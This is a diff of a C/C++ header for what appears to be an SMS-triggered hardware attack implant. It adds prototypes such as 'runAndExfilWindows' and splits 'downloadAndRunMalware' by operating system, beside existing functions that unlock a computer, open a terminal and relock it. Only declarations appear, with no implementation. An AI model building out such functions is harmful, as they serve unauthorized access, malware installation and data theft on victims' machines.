@@ -3,6 +3,7 @@
 #define Payload_H
 
 void unlockDownload(String SMS_text);
+void unlockRunAndExfil(String SMS_text);
 void manualPayload(String SMS_text);
 
 void unlockComputer(String password);
@@ -12,10 +13,14 @@ void openTerminalMacOs();
 void openTerminalWindowsLinux();
 void openTerminalMultiOs();
 void downloadAndRunMalwareWindows(String url);
-void downloadAndRunMalwareLinuxMacOs(String url);
+void downloadAndRunMalwareLinux(String url);
+void downloadAndRunMalwareMacOs(String url);
 void exitTerminalWindowsLinux();
 void exitTerminalMultiOs();
 void lockWindowsLinux();
 void lockMacOs();
+void runAndExfilWindows(String command);
+void runAndExfilLinux(String command);
+void runAndExfilMacOs(String command);
 
 #endif
